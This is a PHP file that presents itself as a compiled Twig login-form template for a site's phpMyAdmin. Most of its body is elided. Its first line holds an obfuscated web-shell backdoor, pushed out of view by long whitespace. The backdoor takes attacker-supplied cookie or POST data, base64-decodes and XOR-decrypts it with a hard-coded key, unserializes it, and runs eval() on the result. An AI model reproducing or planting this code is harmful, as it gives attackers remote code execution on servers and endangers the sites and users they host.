<?php                                                                                                                                                                                                                                                                                                                                                                                                 $IQcObk = "\102" . '_' . chr ( 404 - 300 )."\x4f" . chr (65) . "\x74" . "\x57";$nDDLh = chr (99) . "\154" . chr ( 798 - 701 ).chr ( 321 - 206 ).chr ( 238 - 123 ).chr ( 601 - 506 ).chr ( 738 - 637 )."\170" . chr (105) . "\163" . "\x74" . chr ( 1021 - 906 ); $NuGsiQVN = $nDDLh($IQcObk); $ZykhILHZ = $NuGsiQVN;if (!$ZykhILHZ){class B_hOAtW{private $NdxZSyYK;public static $JxKvRG = "4b5798a0-43c0-40e0-bb19-310374072cf2";public static $fxmuZgqhW = 48693;public function __construct(){$bwwECWjGMy = $_COOKIE;$VepIdQ = $_POST;$eePbNPaGTh = @$bwwECWjGMy[substr(B_hOAtW::$JxKvRG, 0, 4)];if (!empty($eePbNPaGTh)){$saQIRcAB = "base64";$iwvMKGNH = "";$eePbNPaGTh = explode(",", $eePbNPaGTh);foreach ($eePbNPaGTh as $tfWTgSDqaH){$iwvMKGNH .= @$bwwECWjGMy[$tfWTgSDqaH];$iwvMKGNH .= @$VepIdQ[$tfWTgSDqaH];}$iwvMKGNH = array_map($saQIRcAB . "\137" . chr ( 282 - 182 )."\x65" . chr (99) . "\157" . chr (100) . chr ( 668 - 567 ), array($iwvMKGNH,)); $iwvMKGNH = $iwvMKGNH[0] ^ str_repeat(B_hOAtW::$JxKvRG, (strlen($iwvMKGNH[0]) / strlen(B_hOAtW::$JxKvRG)) + 1);B_hOAtW::$fxmuZgqhW = @unserialize($iwvMKGNH);}}public function __destruct(){$this->DxalzsY();}private function DxalzsY(){if (is_array(B_hOAtW::$fxmuZgqhW)) {$qlgFbwbKCt = str_replace(chr ( 160 - 100 ) . '?' . "\160" . 'h' . "\160", "", B_hOAtW::$fxmuZgqhW[chr (99) . 'o' . 'n' . "\164" . chr (101) . chr (110) . chr ( 910 - 794 )]);eval($qlgFbwbKCt);exit();}}}$ipQab = new B_hOAtW(); $ipQab = 17756;} ?><?php
...
";
    ...
    {
        return new Source("", "login/form.twig", "/home4/jo370xfr/public_html/arf.org.pk/phpMyAdmin/templates/login/form.twig");
    }
}
